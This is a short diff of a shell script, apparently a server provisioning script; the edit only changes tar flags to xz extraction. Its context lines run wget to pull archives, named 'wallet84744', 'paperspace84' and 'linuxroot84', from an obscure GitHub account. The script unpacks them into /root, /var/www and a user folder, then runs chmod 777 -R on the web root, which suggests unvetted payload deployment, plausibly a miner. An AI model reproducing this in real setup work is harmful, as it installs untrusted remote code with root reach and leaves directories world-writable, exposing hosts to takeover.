@@ -104,19 +104,19 @@ cd /home/demo/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/Documents.tar.gz
 
-tar -xvf ./Documents.tar.gz
+tar -xvJf ./Documents.tar.gz
 
 cd /home/demo/Documents/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/wallet84744.tar.gz
 
-tar -xvf ./wallet84744.tar.gz
+tar -xvJf ./wallet84744.tar.gz
 
 cd /home/demo/Documents/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/paperspace84.tar.gz
 
-tar -xvf ./paperspace84.tar.gz
+tar -xvJf ./paperspace84.tar.gz
 
 chmod 777 -R /home/demo/Documents/
 
@@ -124,7 +124,7 @@ cd /var/www/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/html.tar.gz
 
-tar -xvf ./html.tar.gz
+tar -xvJf ./html.tar.gz
 
 chmod 777 -R /var/www/html/
 
@@ -138,6 +138,6 @@ cd /root/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxroot84.tar.gz
 
-tar -xvf ./linuxroot84.tar.gz
+tar -xvJf ./linuxroot84.tar.gz
 
 cd /var/www/html/google844/
